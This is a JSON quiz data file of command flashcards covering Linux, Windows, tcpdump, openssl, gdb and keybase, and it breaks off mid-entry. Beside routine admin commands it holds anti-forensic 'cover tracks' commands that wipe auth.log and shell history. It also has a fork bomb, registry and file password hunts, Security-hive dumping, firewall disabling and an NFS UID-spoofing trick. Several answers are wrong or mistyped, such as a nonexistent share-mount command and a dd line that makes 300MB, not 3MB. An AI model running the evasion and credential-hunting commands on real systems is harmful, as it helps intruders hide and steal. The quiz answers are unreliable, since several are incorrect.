{"modules":[{"name":"linux/network","questions":[{"question":"List all udp connections on this machine.","answer":"netstat -lanu"},{"question":"List all TCP connections on this machine.","answer":"netstat -lant"},{"question":"How do you list all established connections?","answer":"lsof -i"},{"question":"How do you access a Windows SMB share at 192.168.0.1?","answer":"smb://192.168.0.1/share"},{"question":"How do you do a domain lookup for ip 1.2.3.4 using host?","answer":"host 1.2.3.4"},{"question":"How do you turn on IP forwarding on a Linux box?","answer":"echo \"1\" > /proc/sys/net/ipv4/ip_forward"},{"question":"How do you do a DNS Zone transfer for IP 1.2.3.4 and domain site.com?","answer":"dig @1.2.3.4 site.com -t AXFR"},{"question":"Add DNS Server 8.8.8.8 to a Linux host?","answer":"echo \"nameserver 8.8.8.8\" > /etc/resolv.conf"},{"question":"Mount a Windows share at 1.2.3.4 on Linux?","answer":"share user 1.2.3.4 c$"},{"question":"Set the default gateway on a linux box to 1.2.3.4 ?","answer":"route add default gw 1.2.3.4"},{"question":"Block the evil IP address 6.6.6.6 on port 8080 on a linux machine.","answer":"tcpkill host 6.6.6.6 and port 8080"}],"commands":[{"command":"watch ss -tp","comment":"Network connections"},{"command":"netstat -lant","comment":"Tcp connections (-lanu = udp)"},{"command":"lsof -i","comment":"Established connections"},{"command":"smb://<IP>/share","comment":"Access windows SMB share"},{"command":"share user x.x.x.x c$","comment":"Mount Windows Share"},{"command":"smbclient -U user \\\\\\\\<IP>\\\\<SHARE>","comment":"SMB connect"},{"command":"ifconfig eth# <IP>/<CIDR>","comment":"Set IP and netmask"},{"command":"ifconfig eth0:1 <IP>/<CIDR>","comment":"Set Virtual Interface"},{"command":"route add default gw <GW_IP>","comment":"Set Gateway"},{"command":"ifconfig eth# mtu [SIZE]","comment":"Change MTU size"},{"command":"export MAC=xx.xx.xx.xx.xx.xx","comment":"Change MAC"},{"command":"ifconfig <INT> hw ether <MAC>","comment":"Change MAC"},{"command":"macchanger -m <MAC> <INT>","comment":"Kali MAC changer"},{"command":"iwlist <INT> scan","comment":"Built-in Wifi Scanner"},{"command":"dig -x <IP>","comment":"Domain lookup for IP"},{"command":"host <IP>","comment":"Domain lookup for IP"},{"command":"host -t SRV _<SERVICE>_tcp.url.com","comment":"Domain SRV lookup"},{"command":"dig @<IP> domain -t AXFR","comment":"DNS Zone Xfer"},{"command":"host -l <DOMAIN> <NAMESVR>","comment":"DNS Zone Xfer"},{"command":"ip xfrm state list","comment":"Print existing VPN keys"},{"command":"ip addr add <IP>/<CIDR> dev eth0","comment":"Adds 'hidden' interface"},{"command":"/var/log/messages |grep DHCP","comment":"List DHCP assignments"},{"command":"tcpkill host <IP> and port <PORT>","comment":"Block ip:port"},{"command":"echo \"1\" > /proc/sys/net/ipv4/ip_forward","comment":"Turn on IP forwarding"},{"command":"echo \"nameserver x.x.x.x\" > /etc/resolve.conf","comment":"Add DNS server"}],"tags":[{"tag":"networking","none":"non"},{"tag":"linux","none":"asdf"}],"platform":""},{"name":"linux/system_info","questions":[{"question":"How do you find the hostname for IP 1.2.3.4 using nbtstat/nmblookup?","answer":"nmblookup -A 1.2.3.4"},{"question":"List the current username in linux.","answer":"id"},{"question":"List logged on users.","answer":"w"},{"question":"How do you list mounted file systems on a Linux box?","answer":"mount"},{"question":"How do you show a list of users on the on a Linux box?","answer":"getent passwd"},{"question":"How would you add path /home/mypath to the PATH variable?","answer":"PATH=$PATH:/home/mypath"},{"question":"How do you list installed packages on Ubuntu?","answer":"dpkg -get-selections"}],"commands":[{"command":"nmblookup -A <IP>","comment":"Get host name for <IP>"},{"command":"id","comment":"Current Username"},{"command":"w","comment":"Logged on users"},{"command":"who -a","comment":"User information"},{"command":"last -a","comment":"Last users logged on"},{"command":"ps -ef","comment":"Process Listing (top)"},{"command":"df -h","comment":"Disk Usage (free)"},{"command":"uname -a","comment":"Kernel version/CPU info"},{"command":"mount","comment":"Mounted file systems"},{"command":"getent passwd","comment":"Show list of users"},{"command":"PATH=$PATH:/home/mypath","comment":"Add to PATH variable"},{"command":"kill <pid>","comment":"Kill a process by id"},{"command":"cat /etc/issue","comment":"Show OS info"},{"command":"cat /etc/*release*","comment":"Show OS version info"},{"command":"cat /proc/version","comment":"Show kernel info"},{"command":"dpkg -get-selections","comment":"Installed Packages (Ubuntu)"},{"command":"dpkg -I *.deb","comment":"Installed DEB (-r=remove)"},{"command":"which","comment":"Show location of executable"}],"tags":[{"tag":"linux","none":"asdf"}],"platform":""},{"name":"linux/utility","questions":[{"question":"Grab the URL site.com using wget on linux and save to a file called url.txt","answer":"wget http://site.com -O url.txt -o /dev/null"},{"question":"Connect to 1.2.3.4 via remote desktop on Linux.","answer":"rdesktop 1.2.3.4"},{"question":"Add a user named frank on a Linux machine.","answer":"useradd -m frank"},{"question":"How do you changes user frank's password on Linux?","answer":"passwd frank"},{"question":"How do you remove user frank from Linux?","answer":"rmuser frank"},{"question":"How do you record the shell session to file ~/outfile.txt in linux?","answer":"script -a ~/outfile.txt"},{"question":"Execute line 72 in history in Linux.","answer":"!72"}],"commands":[{"command":"wget http://<url> -O url.txt -o /dev/null","comment":"Grab URL"},{"command":"rdesktop <IP>","comment":"Remote Desktop to <IP>"},{"command":"useradd -m <user>","comment":"Add User"},{"command":"passwd <user>","comment":"Change user password"},{"command":"rmuser <uname>","comment":"Remove user"},{"command":"script -a <outfile>","comment":"Record shell : Ctrl-D stops"},{"command":"history","comment":"View users command history"},{"command":"!<num>","comment":"Executes line # in history"}],"tags":[{"tag":"linux","none":""},{"tag":"utility","none":"add tag basics"},{"tag":"basics","none":""},{"tag":"linux","none":"adsf"}],"platform":""},{"name":"linux/file","questions":[{"question":"How would you diff the files file1.txt and file2.txt?","answer":"diff file1.txt file2.txt"},{"question":"How would you create a file called newfile.txt that would have the timestamp of the file oldfile.txt?","answer":"touch -r oldfile.txt newfile.txt"},{"question":"Change the file file.txt to have timestamp of Oct, 22. 2017 at 06:22 am?","answer":"touch -t 201710220622 file.txt"}],"commands":[{"command":"diff file1 file2","comment":"Compare Files"},{"command":"rm -rf <dir>","comment":"Force delete <dir>"},{"command":"shred -f -u <file>","comment":"Overwrite/delete file"},{"command":"touch -r <ref_file> <file>","comment":"Matches ref_file timestamp"},{"command":"touch -t YYYYMMDDHHSS <file>","comment":"Set file timestamp"}],"tags":[{"tag":"linux","none":"asdf"},{"tag":"file","none":"asdf"}],"platform":""},{"name":"linux/misc","questions":[{"question":"How to disable history logging on a linux machine?","answer":"unset HISTFILE"},{"question":"How would you compile a file called file.c to a file called outfile using gcc?","answer":"gcc -o outfile file.c"},{"question":"How would you make a random 3MB file in linux called newfile?","answer":"dd if=/dev/urandom of=newfile bs=3145728 count=100"}],"commands":[{"command":"unset HISTFILE","comment":"Disable history logging"},{"command":"gcc -o outfile myfile.c","comment":"Compile C,C++ with gcc"},{"command":"grep 'href=' <FILE> |cut -d\"/\" -f3 |grep <URL> |sort -u","comment":"Strip links in url.com"},{"command":"dd if=/dev/urandom of=<FILE> bs=3145728 count=100","comment":"Make random 3MB file"}],"tags":[{"tag":"linux","none":"asdf"}],"platform":""},{"name":"linux/cover_tracks","questions":[{"question":"How would you clear the auth.log file on a Linux Box?","answer":"echo \"\" > /var/log/auth.log"},{"question":"How would you clear the current user bash history in Linux?","answer":"echo \"\" > ~/.bash_history"},{"question":"How would you clear session history in Linux?","answer":"history -c"},{"question":"How would you disable history logging in linux?","answer":"unset HISTFILE"}],"commands":[{"command":"echo \"\" > /var/log/auth.log","comment":"Clear auth.log file"},{"command":"echo \"\" > ~/.bash_history","comment":"Clear current user bash history"},{"command":"rm -rf ~/.bash_history","comment":"Delete bash history file"},{"command":"history -c","comment":"Clear current session history"},{"command":"export HISTFILESIZE=0","comment":"Set history max lines to zero"},{"command":"export HISTSIZE=0","comment":"Set history max commands to 0"},{"command":"unset HISTFILE","comment":"Disable history logging (need to logout to take effect)"}],"tags":[{"tag":"linux","none":"asdf"},{"tag":"hacking","none":"asdf"},{"tag":"pentest","none":"asdf"},{"tag":"hiding","none":"asdf"},{"tag":"persistence","none":"asdf"}],"platform":""},{"name":"linux/hack_scripting","questions":[{"question":"How would you fork bomb linux?","answer":":(){:|: &};:"},{"question":"How would one do a ping sweep for the 192.168.0.1/24 network?","answer":"for x in {1..254..1};do ping -c 1 192.168.0.$x"}],"commands":[{"command":":(){:|: &};:","comment":"Fork Bomb"},{"command":"for x in {1..254..1};do ping -c 1 1.1.1.$x","comment":"Ping Sweep"}],"tags":[{"tag":"linux","none":"adsf"},{"tag":"hacking","none":"asdf"},{"tag":"script","none":"asdf"}],"platform":""},{"name":"linux/iptables","questions":[{"question":"How would you dump iptables rules to a file called newfile?","answer":"iptables-save -c > newfile"},{"question":"How would you restore iptables rules from file newfile?","answer":"iptables-restore newfile"},{"question":"How would you flush all iptables rules?","answer":"iptables -F"},{"question":"How would you delete the 7th inbound rule in iptables?","answer":"iptables -D INPUT 7"},{"question":"How would you drop all packets in iptables?","answer":"iptables -P INPUT DROP"}],"commands":[{"command":"iptables-save -c > <FILE>","comment":"Dump iptables (with counters) rules to stdout"},{"command":"iptables-restore <FILE>","comment":"Restore iptables rules"},{"command":"iptables -L -v --line-numbers","comment":"List all iptables rules with affected and line numbers"},{"command":"iptables -F","comment":"Flush all iptables rules"},{"command":"iptables -P <INPUT/FORWARD/OUTPUT> <ACCEPT/REJECT/DROP>","comment":"Change default policy for rules that don't match rules"},{"command":"iptables -D INPUT 7","comment":"Delete 7th Inbound rule"},{"command":"iptables -t raw -L -n","comment":"Increase throughput by turning off statefulness"},{"command":"iptables -P INPUT DROP","comment":"Drop all packets"},{"command":"iptables -A INPUT -i <interface> -m state --state RELATED,ESTABLISHED -j ACCEPT","comment":"Allow established connections on INPUT"},{"command":"iptables -A OUTPUT -o <iface> -p tcp --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT","comment":"Establish outbound rule for ssh on port 22 in iptables"},{"command":"iptable -A INPUT -i <iface> -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT","comment":"Establish inbound connection for outbound ssh on port 22 in iptables"}],"tags":[{"tag":"linux","none":"asdf"},{"tag":"firewall","none":"asdf"},{"tag":"iptables","none":"asdf"},{"tag":"pivoting","none":"asdf"}],"platform":""},{"name":"networking/tcpdump","questions":[{"question":"How do you capture only 7 packets from device eth0?","answer":"tcpdump -c 7 -i eth0"},{"question":"How do you capture traffic from device eth0 in ASCII and HEX, using tcpdump?","answer":"tcpdump -XX -i eth0"},{"question":"How do you read the pcap file file.pcap using tcpdump?","answer":"tcpdump -r file.pcap"},{"question":"How do you write a packet capture to a file called file.pcap, listening on device eth0, using tcpdump?","answer":"tcpdump -w file.pcap -i eth0"},{"question":"How do you capture only IP packets on eth0 using tcpdump?","answer":"tcpdump -n -i eth0"},{"question":"How would you capture only tcp packets on eth0 using tcpdump?","answer":"tcpdump -i eth0 tcp"}],"commands":[{"command":"tcpdump -i eth0","comment":"Listen to all packets on device eth0"},{"command":"tcpdump -c 5 -i eth0","comment":"Capture 5 packets from device eth0"},{"command":"tcpdump -A -i eth0","comment":"Listen to all packets from eth0 and print as ASCII"},{"command":"tcpdump -D","comment":"Display available interfaces"},{"command":"tcpdump -XX -i eth0","comment":"Display all packets in HEX and ASCII"},{"command":"tcpdump -w file.pcap -i eth0","comment":"Write all captured packets to a file"},{"command":"tcpdump -r savedcap.pcap","comment":"Read captured packets file"},{"command":"tcpdump -n -i eth0","comment":"Capture IP address packets"},{"command":"tcpdump -i eth0 tcp","comment":"Capture only tcp packets"},{"command":"tcpdump -i eth0 port 22","comment":"Capture packets from only port 22"},{"command":"tcpdump -i eth0 src 1.2.3.4","comment":"Capture packets from source IP 1.2.3.4"}],"tags":[],"platform":""},{"name":"windows/cmd/system_info","questions":[{"question":"How do you get the windows OS version in CMD?","answer":"ver"},{"question":"List all Windows services in CMD terminal.","answer":"sc query state=all"},{"question":"How do you list Windows processes and services using CMD?","answer":"tasklist /svc"},{"question":"How do you list Windows prcesses and DLLs using CMD?","answer":"tasklist /m"},{"question":"How would you search the Windows registry for passwords?","answer":"reg query HKLM /f password /t REG_SZ /s"},{"question":"How would you list Windows Drives using CMD?","answer":"fsutil fsinfo drives"},{"question":"Search a Windows machine for pdf files using CMD?","answer":"dir /a /s /b c:\\*.pdf*"},{"question":"How would you search for passwords on a windows machine in files of a specific type?","answer":"findstr /si password *.txt| *.xls"},{"question":"Save Windows security hive to file.","answer":"reg save HKLM\\Security security.hive"},{"question":"Print current user in Windows using CMD","answer":"echo %USERNAME%"}],"commands":[{"command":"ver","comment":"Get OS Version"},{"command":"sc query state=all","comment":"Get services"},{"command":"tasklist /svc","comment":"Show processes and services"},{"command":"tasklist /m","comment":"Show all processes and DLLs"},{"command":"tasklist /S <IP> /v","comment":"Remote process listing for IP"},{"command":"taskkill /PID <PID> /F","comment":"Kill a PID"},{"command":"systeminfo /S <IP> /U domain\\user /P <pwd>","comment":"Remote Sytem info"},{"command":"req query \\\\<IP>\\<RegDomain>\\<Key> /v","comment":"Query remote registry"},{"command":"reg query HKLM /f password /t REG_SZ /s","comment":"Search registry for passwords"},{"command":"fsutil fsinfo drives","comment":"List drives \"must be admin\""},{"command":"dir /a /s /b c:\\*.pdf*","comment":"Search for all pdfs"},{"command":"findstr /si password *.txt| *.xml| *.xls","comment":"Searches for password in specific file types"},{"command":"reg save HKLM\\Security security.hive","comment":"Save security hive to file"},{"command":"echo %USERNAME%","comment":"Current user"}],"tags":[],"platform":""},{"name":"windows/cmd/net_domain","questions":[{"question":"How would you list Hosts in a current domain in Windows via CMD?","answer":"net view /domain"},{"question":"List the hosts in MYDOMAIN in Windows via CMD.","answer":"net view /domain:MYDOMAIN"},{"question":"How do you list all users in a domain in Windows via CMD?","answer":"net user /domain"},{"question":"How do you add user frank with password 'password' to a Windows account via CMD?","answer":"net user frank password /add"},{"question":"How do you add user frank to the local Admin group on a Windows box via CMD?","answer":"net localgroup \"Administrators\" frank /add"},{"question":"List the domain password policy in Windows via CMD.","answer":"net accounts /domain"},{"question":"List the local Windows Adminstrators group in CMD.","answer":"net localgroup \"Administrators\""},{"question":"How do you list the domain groups in Windows via CMD?","answer":"net group /domain"},{"question":"How do you list users in \"Domain Admins\" group on a Windows domain via CMD?","answer":"net group \"Domain Admins\" /domain"},{"question":"List current SMB shares in Windows via CMD.","answer":"net share"},{"question":"How would you chage domain user frank's password in Windows to 'password' via CMD?","answer":"net user frank \"password\" /domain"},{"question":"How would you unlock domain user frank's account in Windows using CMD?","answer":"net user frank /ACTIVE:yes /domain"}],"commands":[{"command":"net view /domain","comment":"Hosts in current domain"},{"command":"net view /domain:[MYDOMAIN]","comment":"Hosts in [MYDOMAIN]"},{"command":"net user /domain","comment":"All users in current domain"},{"command":"net user <user> <pass> /add","comment":"Add user"},{"command":"net localgroup \"Administrators\" <user> /add","comment":"Add user to local administrators"},{"command":"net accounts /domain","comment":"Domain password policy"},{"command":"net localgroup \"Administrators\"","comment":"Local admins"},{"command":"net group /domain","comment":"List domain groups"},{"command":"net group \"Domain Admins\" /domain","comment":"List users in Domain Admins"},{"command":"net group \"Domain Controllers\" /domain","comment":"List DCs for current domain"},{"command":"net share","comment":"List current SMB shares"},{"command":"net user <user> \"<newpassword>\" /domain","comment":"Change domain user password"},{"command":"net user <user> /ACTIVE:yes /domain","comment":"Unlock domain user account"},{"command":"net share <share> C:\\share /GRANT:Everyone,FULL","comment":"Share folder"}],"tags":[{"tag":"windows","none":"asdf"},{"tag":"domain","none":"asdf"}],"platform":""},{"name":"windows/cmd/network","questions":[{"question":"List local DNS cache on Windows using CMD","answer":"ipconfig /displaydns"},{"question":"List all listening ports in Windows using CMD.","answer":"netstat -an| findstr LISTENING"},{"question":"Print routing table in Windows using CMD.","answer":"route print"},{"question":"View the ARP table in Windows using CMD.","answer":"arp -a"},{"question":"How would you sniff network traffic in Windows and store the output to a file c:\\temp\\nettrace.etl?","answer":"netsh trace start persistent=yes capture=yes tracefile=c:\\temp\\nettrace-boot.etl"},{"question":"How do you set an IP address to 1.2.3.4 with gateway 1.2.3.0, id 2, and netmask of 255.255.255.0 in Windows via CMD?","answer":"netsh interface ip set address local static 1.2.3.4 255.255.255.0 1.2.3.0 2"},{"question":"How would you set a DNS server of 8.8.8.8 in Windows via CMD?","answer":"netsh interface ip set dns local static 8.8.8.8"},{"question":"How would in set an interface to user DHCP in Windows via CMD?","answer":"netsh interface ip set address local dhcp"}],"commands":[{"command":"ipconfig /all","comment":"IP configuration"},{"command":"ipconfig /displaydns","comment":"Local DNS cache"},{"command":"netstat -an| findstr LISTENING","comment":"LISTENING Ports"},{"command":"route print","comment":"Routing Table"},{"command":"arp -a","comment":"ARP table"},{"command":"nslookup set type=any, ls -d domain > results.txt, exit.","comment":"DNS Zone Xfer"},{"command":"netsh interface ip show interfaces","comment":"List interfaces IDs/MTUs"},{"command":"netsh interface ip set address local static <IP> <NETMASK> <GW> <ID>","comment":"Set IP"},{"command":"netsh interface ip set dns local static <IP>","comment":"Set DNS server"},{"command":"netsh interface ip set address local dhcp","comment":"Set interface to user DHCP"},{"command":"netsh trace start persistent=yes capture=yes tracefile=c:\\temp\\nettrace-boot.etl","comment":"A network trace/capture"}],"tags":[],"platform":""},{"name":"windows/cmd/utility","questions":[{"question":"How do you display the contents of the file 'newfile' in Windows using CMD?","answer":"type newfile"},{"question":"Delete all files in path c:\\temp\\ in Windows using CMD.","answer":"del c:\\temp\\*.* /a /s /q /f"},{"question":"How do you find the string \"hello\" in the file test.txt in Windows using CMD?","answer":"find /I \"hello\" test.txt"},{"question":"How do you run 'cmd /c' as the user tyler in Windows via CMD?","answer":"runas /user:tyler \"cmd /c\""},{"question":"How do you uninstall the patch kb 1234 in Windows via CMD?","answer":"Wusa.exe /uninstall /kb:1234"}],"commands":[{"command":"type <FILE>","comment":"Display file contents"},{"command":"del <PATH>\\*.* /a /s /q /f","comment":"Forcably delete all files in PATH"},{"command":"find /I \"str\" <FILENAME>","comment":"Find \"str\""},{"command":"<command> | find /c /v \"\"","comment":"Line count of <cmd> output"},{"command":"runas /user:<USER> \"<file> [args]\"","comment":"Run <file> as <USER>"},{"command":"tr -d '\\15\\32' < win.txt > unix.txt","comment":"Remove CR & ^Z (*nix)"},{"command":"makecab <file>","comment":"Native Compression"},{"command":"Wusa.exe /uninstall /kb:<####>","comment":"Uninstall Patch"},{"command":"cmd.exe \"wevtutil qe Application /c:40 /f:text /rd:true\"","comment":"CLI Event Viewer"},{"command":"lusrmgr.msc","comment":"Local user manager"},{"command":"services.msc","comment":"Services control pane"},{"command":"taskmgr.exe","comment":"Task manager"},{"command":"secpool.msc","comment":"Security Policy manager"},{"command":"eventvwr.msc","comment":"Event Viewer"}],"tags":[],"platform":""},{"name":"windows/dsc","questions":[{"question":"How do you force DSC to update in windows?","answer":"Start-DscConfiguration -useexisting -wait -verbose"}],"commands":[{"command":"Start-DscConfiguration -useexisting -wait -verbose","comment":"Force the DSC to update"}],"tags":[],"platform":""},{"name":"windows/firewall","questions":[{"question":"How would you disable the Windows Firewall for the current profile?","answer":"netsh advfirewall set currentprofile state off"},{"question":"How would you disable the Windows Firewall for all profiles?","answer":"netsh advfirewall set allprofiles state off"}],"commands":[{"command":"netsh advfirewall set currentprofile state off","comment":"Disable the firewall for the current profile"},{"command":"netsh advfirewall set allprofiles state off","comment":"Disable the firewall for all profiles"}],"tags":[],"platform":""},{"name":"windows/powershell/basic","questions":[{"question":"Search for Powershell commands with keyword 'domain'","answer":"Get-Command *domain*"},{"question":"How do you display services using Windows Powershell?","answer":"Get-Service"},{"question":"How do you display powershell version?","answer":"$PSVersionTable"},{"question":"Open powershell version 2 from a different version of powershell","answer":"powershell.exe -version 2.0"},{"question":"How do you list processes (name only) in Windows Powershell?","answer":"Get-Process | select -expandproperty name"},{"question":"How do you get a list of drives in Powershell?","answer":"get-psdrive"},{"question":"How do you get the number of services using Windows Powershell?","answer":"get-service | measure-object"}],"commands":[{"command":"get-content <FILE>","comment":"Display File contents"},{"command":"get-help <COMMAND> -examples","comment":"Shows examples of <COMMAND>"},{"command":"get-command *<string>*","comment":"Searches for command <string>"},{"command":"get-service","comment":"Displays services (also stop-service and start-service)"},{"command":"$PSVersionTable","comment":"Display powershell version"},{"command":"powershell.exe -version 2.0","comment":"Open powershell version 2 (from other ps versions)"},{"command":"Get-Process | select -expandproperty name","comment":"Get processes (names only)"},{"command":"get-psdrive","comment":"Returns list of PSDrives"},{"command":"get-service | measure-object","comment":"Returns # if services"},{"command":"get-help * -parameter credential","comment":"Cmdlet that take cred"}],"tags":[],"platform":""},{"name":"linux/hack/nfs","questions":[{"question":"Check to see if there are NFS services running on 1.2.3.4 from a Linux terminal.","answer":"rpcinfo -p 1.2.3.4"},{"question":"Retrieve a list of exported folders on NFS share at 1.2.3.4, in Linux.","answer":"showmount -e 1.2.3.4"},{"question":"List directories of open NFS share at 1.2.3.4 using linux.","answer":"showmount -d 1.2.3.4"},{"question":"List mount points at NFS share at 1.2.3.4 using Linux","answer":"showmount -a 1.2.3.4"},{"question":"Mount the remote NFS share at 1.2.3.4 in the local dir /tempdir","answer":"mount -t nfs 1.2.3.4:/ /tempdir -o nolock"}],"commands":[{"command":"rpcinfo -p <IP>","comment":"Determine if any mountd and NFS services running on host"},{"command":"showmount -e <IP>","comment":"Retrieve list of exported folders for a given host."},{"command":"showmount IP","comment":"Show connected hosts for NFS"},{"command":"showmount -d <IP>","comment":"Show directories"},{"command":"showmount -a <IP>","comment":"Show Mount Points"},{"command":"mount -t nfs 1.2.3.4:/ /tempdir -o nolock","comment":"Accessing exported NFS files by creating empty 'tempdir' and mounting the share to thsi."},{"command":"1.) Add username. 2.) Edit and change UID and GUID in /etc/passwd file","comment":"Try and trick UID of mounted file system if \"root_squash\" isn't enables for the NFS mount. "},{"command":"nano /etc/exports","comment":"File to edit to add either root_squash or no_root_squash"}],"tags":[],"platform":""},{"name":"crypto/openssl","questions":[{"question":"Create a 2048 bit private key domain.key and CSR domain.csr from scratch.","answer":"openssl req -newkey rsa:2048 -nodes -keyout domain.key -out domain.csr"},{"question":"Generate CSR domain.csr from existing Private Key domain.key","answer":"openssl req -key domain.key -new -out domain.csr"},{"question":"Generate CSR domain.csr from existing Certificate domain.crt and Private Key domain.key","answer":"openssl x509 -in domain.crt -signkey domain.key -x509toreq -out domain.csr"},{"question":"Generate a self-signed certificate domain.crt and key domain.key","answer":"openssl req -newkey rsa:2048 -nodes -keyout domain.key -x509 -days 365 -out domain.crt"},{"question":"Generate self-signed cert domain.crt from Existing Private Key domain.key","answer":"openssl req -key domain.key -new -x509 -days 365 -out domain.crt"},{"question":"Generate self-signed cert domain.crt from existing private key domain.key, and CSR domain.csr","answer":"openssl x509 -signkey domain.key -in domain.csr -req -days 365 -out domain.crt"},{"question":"How do you verify that a cert domain.crt was signed by the CA cert ca.crt?","answer":"openssl verify -verbose -CAFile ca.crt domain.crt"},{"question":"How do you create a private key domain.key via OpenSSL?","answer":"openssl rsa -des3 -out domain.key 2048"},{"question":"How do you encrypte a private key with OpenSSL?","answer":"openssl rsa -des3 -in unencrypted.key -out encrypted.key"},{"question":"How do you decrypt a private key with OpenSSL?","answer":"openssl rsa -in encrypted.key -out decrypted.key"},{"question":"Convert a PEM cert domain.crt to DER cert domain.der","answer":"openssl x509 -in domain.crt -outform der -out domain.der"},{"question":"Convert a DER cert domain.der to PEM cert domain.crt","answer":"openssl x509 -inform der -in domain.der -out domain.crt"}],"commands":[{"command":"openssl req -newkey rsa:2048 -nodes -keyout domain.key -out domain.csr","comment":"Create 2048 bit private key and CSR from scratch"},{"command":"openssl req -key domain.key -new -out domain.csr","comment":"Generate CSR from existing Private Key"},{"command":"openssl x509 -in domain.crt -signkey domain.key -x509toreq -out domain.csr","comment":"Generate CSR from existing Certificate and Private Key"},{"command":"openssl req -newkey rsa:2048 -nodes -keyout domain.key -x509 -days 365 -out domain.crt","comment":"Generate self-signed Certificate"},{"command":"openssl req -key domain.key -new -x509 -days 365 -out domain.crt","comment":"Generate self-signed cert from Existing Private Key"},{"command":"openssl x509 -signkey domain.key -in domain.csr -req -days 365 -out domain.crt","comment":"Generate Self-Signed Cert from existing Private Key and CSR"},{"command":"openssl x509 -text -noout -in domain.crt","comment":"View Cert entries"},{"command":"openssl verify -verbose -CAFile ca.crt domain.crt","comment":"Verify A cert was Signed by a CA"},{"command":"openssl genrsa -des3 -out domain.key 2048","comment":"Create a Private Key"},{"command":"openssl rsa -check -in domain.key","comment":"Verify that a private key is a valid key. If encrypted, you will be prompted for password."},{"command":"openssl rsa -des3 -in unencrypted.key -out encrypted.key","comment":"Encrypt a Private Key"},{"command":"openssl rsa -in encrypted.key -out decrypted.key","comment":"Decrypt A Private Key"},{"command":"open x509 -in domain.crt -outform der -out domain.der","comment":"Convert PEM to DER"},{"command":"openssl x509 -inform der -in domain.der -out domain.crt","comment":"Convert DER to PEM"},{"command":"openssl pkcs7 -in domain.p7b -print_certs -out domain.crt","comment":"Convert PKCS7 to PEM"},{"command":"openssl pkcs12 -inkey domain.key -in domain.crt -export -out domain.pfx","comment":"Convert PEM to PKCS12"},{"command":"openssl pkcs12 -in domain.pfx -nodes -out domain.combined.crt","comment":"Convert PKCS12 to PEM"}],"tags":[],"platform":""},{"name":"linux/gdb","questions":[{"question":"How do you run executable /bin/bash with argument 'test' using gdb?","answer":"gdb --args /bin/bash test"},{"question":"Set a breakpoint at the main function using GDB","answer":"break main"},{"question":"Set a breakpoint at address 0x12345678 in GDB","answer":"break *0x12345678"},{"question":"Disassemble the function main with GDB","answer":"disassemble main"},{"question":"Show the registers with GDB","answer":"info registers"},{"question":"Show the register 'eip' using GDB","answer":"info registers eip"},{"question":"How do you show a backtrace with local variables in GDB?","answer":"bt full"},{"question":"Examine the hex value of the eip register using GDB","answer":"x/x $eip"},{"question":"How to you step to the next instruction in GDB?","answer":"nexti"},{"question":"How do you find the address of function foo in GDB?","answer":"info address foo"},{"question":"How do you specify to user Intel Syntax in GDB?","answer":"set dis intel"},{"question":"How do you compile file.c to 'outfile' with debugging options in GCC?","answer":"gcc -g -m32 -o outfile file.c"},{"question":"How do you show the source of a binary in GDB if it was compiled with the -g flag?","answer":"list"}],"commands":[{"command":"gdb --args /path/to/executable -args -moreargs","comment":"Run an executable with arguments"},{"command":"break main","comment":"Set a breakpoint"},{"command":"b *0x8080808","comment":"Set a breakpoint at an instruction (address)"},{"command":"disassemble main","comment":"Disassemble a funciton"},{"command":"info registers (ir)","comment":"Show registers"},{"command":"info registers eip (i r eip)","comment":"Show specific register"},{"command":"bt full","comment":"Show a backtrace with local variables"},{"command":"x/x $eip","comment":"View the value of a register"},{"command":"nexti (ni)","comment":"Next instruction"},{"command":"info address foo","comment":"Find a function address"},{"command":"set dis intel","comment":"Use Intel syntax"},{"command":"gcc -g -m32 -o outfile file.c","comment":"GCC compile with debugging options for x86"},{"command":"list","comment":"Show source for binary if compiled with -g flag"},{"command":"ulimit -c unlimited","comment":"Generate core dump on segfault"}],"tags":[],"platform":""},{"name":"crypto/keybase","questions":[{"question":"Prove a twitter account using keybase","answer":"keybase prove twitter"},{"question":"How do you lookup keybase user Tim?","answer":"keybase id Tim"},{"question":"How do you follow keybase user frank?","answer":"keybase follow frank"},{"question":"Encrypt message \"hello\" for keybase user joe.","answer":"keybase encrypt joe -m \"hello\""},{"question":"List all devices and paper keys for keybase","answer":"keybase device list"},{"question":"How do you add a device in keybase?","answer":"keybase device add"},{"question":"How do you make a new paperkey in keybase?","answer":"keybase paperkey"},{"question":"Encrypt file.mov for user joe in keybase.","answer":"keybase encrypt joe -i file.mov -o file.mov.encrypted"},{"question":"How do you sign an executable file test.exe in keybase?","answer":"keybase sign -i test.exe -b -o test.exe.signed"},{"question":"How do you sign a PGP message \"hello\" but don't encode the contents in keybase?","answer":"keybase pgp sign --clearsign -m \"hello\""},{"question":"Verify a PGP signed file test.txt in keybase?","answer":"keybase pgp verify -i test.txt"}],"commands":[{"command":"keybase help","comment":"Help"},{"command":"keybase version","comment":"Version"},{"command":"keybase login","comment":"Login"},{"command":"keybase prove <service>","comment":"Prove an account (twitter, github, etc.)"},{"command":"keybase search <user>","comment":"Find a keybase user"},{"command":"keybase id <user>","comment":"Look up user, verify identity"},{"command":"keybase id <user>@twitter","comment":"Look twitter (or other service) user up"},{"command":"keybase follow <user>","comment":"Track user identidy publicly"},{"command":"keybase follow <user>@reddit","comment":"Follow a reddit (or other service) user"},{"command":"keybase encrypt <user> -m \"secret message\"","comment":"Encrypt a messae for user if you \"follow\" them"},{"command":"keybase device list","comment":"List all devices and paper keys"},{"command":"keybase device remove <ID>","comment":"Revoke device ID"},{"command":"keybase device add","comment":"Provision a new device"},{"command":"keybase paperkey","comment":"Make a new paper key"},{"command":"keybase encrypt <user> -m \"some secret\"","comment":"Encrypt message for user"},{"command":"\t-m","comment":"message flag (as opposed to stdin or file)"},{"command":"-i","comment":"input file flag"},{"command":"-o","comment":"output file flag"},{"command":"-b","comment":"binary output flag (instead of ASCII)"},{"command":"keybase encrypt <user> -in /file.mov -out /file.mov.encrypted","comment":"Encrypt a file for user"},{"command":"keybase decrypt -i /file.mov.encrypted -o /file.mov","comment":"Decrypt a file and save specify output file"},{"command":"keybase decrypt -i message.txt","comment":"Decrypte a single file"},{"command":"keybase sign -m \"I hereby abdicate the throne\"","comment":"Sign a message"},{"command":"keybase sign -i test.exe -b -o test.exe.signed","comment":"Sign a binary"},{"command":"keybase verify test.txt","comment":"Verify a signed file"},{"command":"keybase verify -i test.exe.signed -o test.exe","comment":"Verify a signed binary"},{"command":"keybase pgp <...encrypt stuff..> ","comment":"PGP encryption. Same as regular encryption, just with the pgp param"},{"command":"keybase pgp decrypt -i foo.txt.asc","comment":"Decrypt 